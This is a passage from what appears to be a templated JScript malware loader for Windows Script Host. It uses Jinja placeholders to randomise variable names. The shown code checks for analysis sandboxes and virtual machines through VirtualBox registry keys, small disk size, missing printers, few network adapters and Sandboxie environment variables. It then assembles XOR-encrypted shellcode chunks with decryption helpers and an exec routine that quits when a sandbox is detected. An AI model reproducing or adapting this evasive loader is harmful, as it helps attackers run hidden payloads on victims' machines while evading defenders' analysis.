        var {{ v.jsc_lv_sh2 }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}]));
        var {{ v.jsc_lv_vbr }}=[{{ jsc_vbox_reg_enc }}],{{ v.jsc_lv_vbx }}={{ jsc_vbox_reg_xk }};
        for(var {{ v.jsc_lv_ri2 }}=0;{{ v.jsc_lv_ri2 }}<{{ v.jsc_lv_vbr }}.length;{{ v.jsc_lv_ri2 }}++){{ v.jsc_lv_vbr }}[{{ v.jsc_lv_ri2 }}]^={{ v.jsc_lv_vbx }};
        {{ v.jsc_lv_sh2 }}.RegRead({{ v.fn_build_str }}({{ v.jsc_lv_vbr }}));
        return true;
    } catch(e) {}
    try {
        var {{ v.jsc_lv_fso }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_fs_obj }}]));
        var {{ v.jsc_lv_drv }} = {{ v.jsc_lv_fso }}.GetDrive("C:");
        if ({{ v.jsc_lv_drv }}.TotalSize < 53687091200) return true;
    } catch(e) {}
    try {
        var {{ v.jsc_lv_wmi2 }} = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
        var {{ v.jsc_lv_prq }} = {{ v.jsc_lv_wmi2 }}.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_printer_q }}]));
        var {{ v.jsc_lv_pc }} = 0;
        for (var {{ v.jsc_lv_ep2 }} = new Enumerator({{ v.jsc_lv_prq }}); !{{ v.jsc_lv_ep2 }}.atEnd(); {{ v.jsc_lv_ep2 }}.moveNext()) {{ v.jsc_lv_pc }}++;
        if ({{ v.jsc_lv_pc }} === 0) return true;
    } catch(e) {}
    try {
        var {{ v.jsc_lv_wmi3 }} = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
        var {{ v.jsc_lv_naq }} = {{ v.jsc_lv_wmi3 }}.ExecQuery({{ v.fn_build_str }}([{{ v.jsc_wmi_mac_q }}]));
        var {{ v.jsc_lv_nac }} = 0;
        for (var {{ v.jsc_lv_ena }} = new Enumerator({{ v.jsc_lv_naq }}); !{{ v.jsc_lv_ena }}.atEnd(); {{ v.jsc_lv_ena }}.moveNext()) {{ v.jsc_lv_nac }}++;
        if ({{ v.jsc_lv_nac }} < 2) return true;
    } catch(e) {}
    try {
        var {{ v.jsc_lv_envobj }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_wscript_shell }}])).Environment("Process");
        if ({{ v.jsc_lv_envobj }}({{ v.fn_build_str }}([{{ v.jsc_env_vbox }}])) !== "") return true;
        if ({{ v.jsc_lv_envobj }}({{ v.fn_build_str }}([{{ v.jsc_env_sandboxie }}])) !== "") return true;
    } catch(e) {}
    return false;
}

var {{ v.var_sc }}  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %};
var {{ v.var_key }} = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %};

function {{ v.fn_hex2arr }}(h) {
    var a = []; for (var i = 0; i < h.length; i += 2)
        a.push(parseInt(h.substr(i, 2), 16));
    return a;
}

function {{ v.fn_decrypt }}(d, k) {
    var o = []; for (var i = 0; i < d.length; i++)
        o.push(d[i] ^ k[i % k.length]);
    return o;
}

function {{ v.fn_exec }}() {
    if ({{ v.fn_sandbox }}()) { WScript.Quit(0); }
    var {{ v.jsc_lv_cx }} = -999, {{ v.jsc_lv_cy }} = -999;
